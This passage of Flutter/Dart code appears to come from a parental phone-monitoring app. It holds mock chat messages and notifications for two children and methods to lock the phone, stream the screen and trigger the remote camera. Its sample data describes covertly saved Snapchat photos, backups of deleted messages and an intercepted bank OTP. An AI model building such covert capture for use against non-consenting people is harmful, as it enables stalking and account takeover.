        messageText: "Maths ke formulas yaad kar liye kya tune?",
        timestamp: DateTime.now().subtract(const Duration(days: 5)),
        isIncoming: true,
      ),
      ChatMessage(
        id: "msg_w_old3",
        appType: AppType.whatsApp,
        contactName: "Coaching Center Staff",
        contactIdentifier: "+919988776655",
        messageText: "Reminder: Physics mock test scheduled for coming Sunday at 10 AM.",
        timestamp: DateTime.now().subtract(const Duration(days: 12)),
        isIncoming: true,
      ),
    ],
    'child_2': [
      // WhatsApp
      ChatMessage(
        id: "msg_aw1",
        appType: AppType.whatsApp,
        contactName: "Pooja (Dance Class)",
        contactIdentifier: "+919823456789",
        messageText: "Did you finish the choreography practice for the annual fest?",
        timestamp: DateTime.now().subtract(const Duration(minutes: 22)),
        isIncoming: true,
      ),
      ChatMessage(
        id: "msg_aw2",
        appType: AppType.whatsApp,
        contactName: "Pooja (Dance Class)",
        contactIdentifier: "+919823456789",
        messageText: "Yes! Practiced the hook step 3 times. See you tomorrow!",
        timestamp: DateTime.now().subtract(const Duration(minutes: 19)),
        isIncoming: false,
      ),
      // Instagram
      ChatMessage(
        id: "msg_ai1",
        appType: AppType.instagram,
        contactName: "Sneha Art Studio",
        contactIdentifier: "@sneha_art",
        messageText: "Loved your watercolor sketch on stories! Keep it up 🎨",
        timestamp: DateTime.now().subtract(const Duration(hours: 1)),
        isIncoming: true,
      ),
      // Snapchat
      ChatMessage(
        id: "msg_asnap1",
        appType: AppType.snapchat,
        contactName: "Kavya",
        contactIdentifier: "@kavya_dance",
        messageText: "Streaks 🔥 Practice video bhej jaldi!",
        timestamp: DateTime.now().subtract(const Duration(minutes: 35)),
        isIncoming: true,
        isDeletedBackup: true,
      ),
    ],
  };

  List<ChatMessage> get chatMessages {
    final msgs = _childChatMessages[_activeChildId] ?? [];
    final now = DateTime.now();
    switch (_selectedChatRange) {
      case ChatDateRange.last2Days:
        final cutoff = now.subtract(const Duration(days: 2));
        return msgs.where((m) => m.timestamp.isAfter(cutoff)).toList();
      case ChatDateRange.last7Days:
        final cutoff = now.subtract(const Duration(days: 7));
        return msgs.where((m) => m.timestamp.isAfter(cutoff)).toList();
      case ChatDateRange.last30Days:
        final cutoff = now.subtract(const Duration(days: 30));
        return msgs.where((m) => m.timestamp.isAfter(cutoff)).toList();
      case ChatDateRange.allTime:
        return msgs;
    }
  }

  List<ChatMessage> get allArchivedChatMessages => _childChatMessages[_activeChildId] ?? [];

  // Notification Items per Child
  final Map<String, List<NotificationItem>> _childNotifications = {
    'child_1': [
      NotificationItem(
        id: "notif_group_1",
        packageName: "com.whatsapp",
        appName: "WhatsApp",
        title: "[Class 10-B Study Group] Aman Verma",
        message: "Tomorrow's math assignment questions 4 to 12 solve karke aana sabhi.",
        timestamp: DateTime.now().subtract(const Duration(minutes: 8)),
        isSensitiveAlert: false,
      ),
      NotificationItem(
        id: "notif_contact_1",
        packageName: "com.whatsapp",
        appName: "WhatsApp",
        title: "Chacha Ji (+91 98111 22334)",
        message: "Aryan beta, Papa ko bolna shaam ko call karein.",
        timestamp: DateTime.now().subtract(const Duration(minutes: 12)),
        isSensitiveAlert: false,
      ),
      NotificationItem(
        id: "notif_1",
        packageName: "com.whatsapp",
        appName: "WhatsApp",
        title: "Unknown (+91 98765 43210)",
        message: "Bhai kal jo baat hui thi kisi ko mat batana.",
        timestamp: DateTime.now().subtract(const Duration(minutes: 15)),
        isDeletedBackup: true,
        isSensitiveAlert: true,
      ),
      NotificationItem(
        id: "notif_snap_1",
        packageName: "com.snapchat.android",
        appName: "Snapchat",
        title: "Rohan K. (@rohan_ghost)",
        message: "New Snap received: [Photo Snap captured & saved silently]",
        timestamp: DateTime.now().subtract(const Duration(minutes: 20)),
        isDeletedBackup: true,
      ),
      NotificationItem(
        id: "notif_2",
        packageName: "com.instagram.android",
        appName: "Instagram",
        title: "Priya Sharma (@priya_sharma04)",
        message: "Sent a message: Did you finish the assignment yet?",
        timestamp: DateTime.now().subtract(const Duration(hours: 1)),
      ),
      NotificationItem(
        id: "notif_3",
        packageName: "com.google.android.youtube",
        appName: "YouTube",
        title: "Science Explained",
        message: "New video: Quantum Physics for Beginners is now live!",
        timestamp: DateTime.now().subtract(const Duration(hours: 2)),
      ),
      NotificationItem(
        id: "notif_4",
        packageName: "com.android.mms",
        appName: "Messages (SMS)",
        title: "HDFC-ALERT",
        message: "OTP for transaction of Rs 4,200 is 839201. Valid for 5 mins.",
        timestamp: DateTime.now().subtract(const Duration(minutes: 45)),
        isSensitiveAlert: true,
      ),
    ],
    'child_2': [
      NotificationItem(
        id: "notif_a1",
        packageName: "com.whatsapp",
        appName: "WhatsApp",
        title: "Pooja (Dance Class)",
        message: "Did you finish the choreography practice for the annual fest?",
        timestamp: DateTime.now().subtract(const Duration(minutes: 22)),
        isSensitiveAlert: false,
      ),
      NotificationItem(
        id: "notif_a2",
        packageName: "com.instagram.android",
        appName: "Instagram",
        title: "Sneha Art Studio (@sneha_art)",
        message: "Loved your watercolor sketch on stories! Keep it up 🎨",
        timestamp: DateTime.now().subtract(const Duration(hours: 1)),
        isSensitiveAlert: false,
      ),
      NotificationItem(
        id: "notif_a3",
        packageName: "com.snapchat.android",
        appName: "Snapchat",
        title: "Kavya (@kavya_dance)",
        message: "Sent you a new streak snap 🔥",
        timestamp: DateTime.now().subtract(const Duration(minutes: 35)),
        isDeletedBackup: true,
      ),
    ],
  };
  List<NotificationItem> get notifications => _childNotifications[_activeChildId] ?? [];

  // Watchlist Targets per Child
  final Map<String, List<WatchlistTarget>> _childWatchlists = {
    'child_1': [
      WatchlistTarget(
        id: "target_1",
        name: "Unknown Caller / Contact",
        identifier: "+91 98765 43210",
        note: "Frequently calls late night and asks to delete messages.",
        isHighPriority: true,
        totalCalls: 4,
        totalChats: 18,
        lastInteracted: DateTime.now().subtract(const Duration(minutes: 15)),
      ),
    ],
    'child_2': [],
  };
  List<WatchlistTarget> get watchlistTargets => _childWatchlists[_activeChildId] ?? [];

  void setSelectedChatApp(AppType app) {
    _selectedChatApp = app;
    notifyListeners();
  }

  void toggleLockPhone() {
    _isPhoneLocked = !_isPhoneLocked;
    if (_isPhoneLocked) {
      try {
        _firestore?.collection('devices').doc(_activeTargetDocId).collection('commands').add({
          'action': 'LOCK_PHONE',
          'payload': {},
          'status': 'PENDING',
          'timestamp': FieldValue.serverTimestamp(),
        });
      } catch (e) {
        debugPrint("Could not dispatch lock command: $e");
      }
    }
    notifyListeners();
  }

  void toggleLiveScreen() {
    _isLiveScreenActive = !_isLiveScreenActive;
    if (_isLiveScreenActive) _isRemoteCameraActive = false;
    notifyListeners();
  }

  void toggleRemoteCamera() {
    _isRemoteCameraActive = !_isRemoteCameraActive;
    if (_isRemoteCameraActive) _isLiveScreenActive = false;
    notifyListeners();
  }

  void switchCameraLens() {
    _currentCameraLens = (_currentCameraLens == "back") ? "front" : "back";
    notifyListeners();
  }

  void toggleFlashlight() {
    _isFlashlightOn = !_isFlashlightOn;
    notifyListeners();
  }

  void togglePlayAudio(String callId) {
    if (_currentlyPlayingAudioId == callId) {
      _currentlyPlayingAudioId = null;
    } else {
      _currentlyPlayingAudioId = callId;
    }
    notifyListeners();
  }

  void addWatchlistTarget(String name, String identifier, String note) {
    _childWatchlists.putIfAbsent(_activeChildId, () => []).add(
      WatchlistTarget(
        id: "target_${DateTime.now().millisecondsSinceEpoch}",
        name: name,
        identifier: identifier,
        note: note,
        isHighPriority: true,
        totalCalls: 0,
        totalChats: 0,
        lastInteracted: DateTime.now(),
      ),
    );
    notifyListeners();
  }

  @override
  void dispose() {
    _deviceSub?.cancel();
    _callsSub?.cancel();
    _chatsSub?.cancel();
    _notifsSub?.cancel();
    super.dispose();
  }
}
